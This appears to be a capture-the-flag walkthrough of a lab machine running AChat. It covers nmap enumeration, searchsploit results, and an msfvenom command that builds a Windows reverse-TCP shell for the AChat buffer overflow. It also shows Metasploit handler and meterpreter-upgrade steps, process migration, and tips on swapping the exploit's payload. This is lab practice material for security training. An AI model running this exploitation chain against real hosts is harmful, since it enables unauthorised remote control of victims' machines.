<h1>Chatter 10.10.10.74</h1>

<h2>Nmap</h2>
  nmap -sS -sV -Pn -p 9255,9256 10.10.10.74 -oX chatter_sSV.xml -vv

    address      mac  name  os_name    os_flavor  os_sp  purpose  info  comments
    -------      ---  ----  -------    ---------  -----  -------  ----  --------
    10.10.10.74             Windows 8                    client

    host         port  proto  name   state     info
    ----         ----  -----  ----   -----     ----
    10.10.10.74  9255  tcp    http   open      AChat chat system httpd
    10.10.10.74  9256  tcp    achat  open      AChat chat system
    10.10.10.74  9266  tcp           filtered


<h2>HTTP</h2>
  http http://10.10.10.74:9255
    HTTP/1.1 204 No Content
    Connection: close
    Server: AChat

  http http://10.10.10.74:9266
    http: error: Request timed out (30s).

  Browser: 10.10.10.74:9256
    ERROR

<h2>searchsploit</h2>
  Name                            Disclosure Date  Rank    Description
  ----                            ---------------  ----    -----------
  exploit/windows/misc/achat_bof  2014-12-18       normal  Achat Unicode SEH Buffer Overflow

  Exploit Title                                                       |  Path
                                                                      | (/usr/share/exploitdb/)
  Achat 0.150 beta7 - Remote Buffer Overflow                          | exploits/windows/remote/36025.py
  Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)             | exploits/windows/remote/36056.rb


<h2>Payload creation</h2>

msfvenom -a x86 -p windows/shell/reverse_tcp lhost=10.10.14.105 lport=4446 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

<h2>Listener</h2>
  Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

  Payload options (windows/shell/reverse_tcp):

     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
     LHOST     10.10.14.105     yes       The listen address
     LPORT     4441             yes       The listen port


<h2>Upgrade from shell to meterpreter</h2>
  msf exploit(handler) > use post/multi/manage/shell_to_meterpreter
  msf post(shell_to_meterpreter) > show options

  Module options (post/multi/manage/shell_to_meterpreter):

     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
     LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
     LPORT    4433             yes       Port for payload to connect to.
     SESSION                   yes       The session to run this module on.

  msf post(shell_to_meterpreter) > set session 6
  session => 6
  msf post(shell_to_meterpreter) > run

  [*] Upgrading session ID: 6
  [*] Starting exploit/multi/handler
  [*] Started reverse TCP handler on 10.10.14.105:4433
  [*] Post module execution completed

<h2>Privilege Escalation</h2>
  meterpreter > sysinfo
    Computer        : CHATTERBOX
    OS              : Windows 7 (Build 7601, Service Pack 1).
    Architecture    : x86
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows

  meterpreter > run post/windows/manage/migrate
      [*] Running module against CHATTERBOX
      [*] Current server process: powershell.exe (4012)
      [*] Spawning notepad.exe process to migrate to
      [+] Migrating to 2292
      [+] Successfully migrated to process 2292

  meterpreter > migrate 1608

<h2>Tips / Spoilers</h2>

  Change that giant mass of shellcode
  the author even gave you the msfvenom command to run :wink:
  just replace the `-p windows/exec CMD=calc.exe` part with something like
   `-p windows/shell/reverse_tcp lhost=tun0 lport=4343`

   then upgraded to meterpeter within MSF

   and migrated
